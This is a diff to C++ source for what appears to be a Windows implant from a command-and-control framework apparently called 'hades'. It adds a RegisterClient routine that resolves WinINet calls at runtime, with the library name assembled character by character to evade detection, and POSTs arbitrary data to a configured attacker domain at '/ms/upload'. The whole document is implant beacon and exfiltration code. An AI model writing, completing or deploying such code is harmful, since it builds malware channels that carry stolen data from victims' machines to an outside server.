@@ -1,10 +1,15 @@
 #include "network.hpp"
-#include "apidefs.hpp"
+#include "../utils/apidefs.hpp"
+#include "../hades/config.hpp"
+#include <stdio.h>
 
 
 
 Network::Network() {
 	this->HttpApis = AllocMemory<HTTPAPIS>(sizeof(struct HTTPAPIS));
+	if (this->HttpApis == NULL) {
+		printf("Failed Allocating HTTPApis");
+	}
 	char buf[12];
 	buf[0]  = 'w';
 	buf[1]  = 'i';
@@ -36,7 +41,32 @@ Network::Network() {
 
 
 BOOL Network::RegisterClient(PBYTE Data, SIZE_T DataLength) {
-	return TRUE;
+
+	HINTERNET hInternrt = NULL, hConnect = NULL, hRequest = NULL;
+	const char* h = "Content-Type: application/octect-stream";
+	BOOL ok = FALSE;
+	hInternrt = this->HttpApis->InternetOpenA("TEST", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+	if (!hInternrt) goto CLEANUP;
+
+	hConnect = this->HttpApis->InternetConnectA(hInternrt, conf->domains[0].domain, conf->domains[0].port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+	if (!hConnect) goto CLEANUP;
+
+	hRequest = this->HttpApis->HttpOpenRequestA(hConnect, "POST", "/ms/upload", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
+	if (!hRequest) goto CLEANUP;
+
+	if (!this->HttpApis->HttpSendRequestA(hRequest, h, (DWORD)strlen(h), (LPVOID)Data, DataLength)) {
+		printf("Failed Sending Request\n");
+		goto CLEANUP;
+	}
+	printf("[+] Sent Request Succesfully\n");
+	ok = TRUE;
+
+
+CLEANUP:
+	if (hRequest) this->HttpApis->InternetCloseHandle(hRequest);
+	if (hConnect) this->HttpApis->InternetCloseHandle(hConnect);
+	if (hInternrt) this->HttpApis->InternetCloseHandle(hInternrt);
+	return ok;
 }
 
 
